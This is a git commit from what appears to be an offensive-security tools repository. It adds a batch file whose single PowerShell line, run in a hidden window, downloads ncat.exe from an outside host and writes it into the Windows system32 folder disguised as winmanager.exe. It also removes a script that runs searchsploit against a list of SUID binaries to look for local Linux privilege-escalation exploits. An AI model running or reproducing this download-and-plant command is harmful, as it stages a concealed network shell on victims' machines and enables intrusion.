662049da72ff9bf6e0747c401e615d61f884a8e7
retr0 <you@example.com>
2020-01-11 10:13:45 -0500

    updating tools

---
+++ tools/file-transfers/powershell/powershell-download-and-execute.bat
@@ -0,0 +1,1 @@
+powershell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://virtualsquad.ninja/ncat.exe','C:\WINDOWS\system32\winmanager.exe');
--- tools/lateral-movement/searchsploit.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-file_name=$1
-
-for suid in $(cat $file_name); do
-    echo Looking exploits for $suid
-    searchsploit $suid local linux |grep -v -i "No Result"
-    echo '**********************************************'
-done
